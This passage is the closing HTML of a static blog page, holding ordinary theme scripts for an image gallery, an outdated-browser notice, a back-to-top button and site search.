$.fn.lightGallery&&$(".article").lightGallery({selector:".gallery-item"}),"function"==typeof $.fn.justifiedGallery&&($(".justified-gallery > p > .gallery-item").length&&$(".justified-gallery > p > .gallery-item").unwrap(),$(".justified-gallery").justifiedGallery())})</script><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now</a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load",(function(){outdatedBrowser({bgColor:"#f25648",color:"#ffffff",lowerThan:"object-fit"})}))</script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",(function(){loadInsight({contentUrl:"/content.json"},{hint:"Type something...",untitled:"(Untitled)",posts:"Posts",pages:"Pages",categories:"Categories",tags:"Tags"})}))</script></body></html>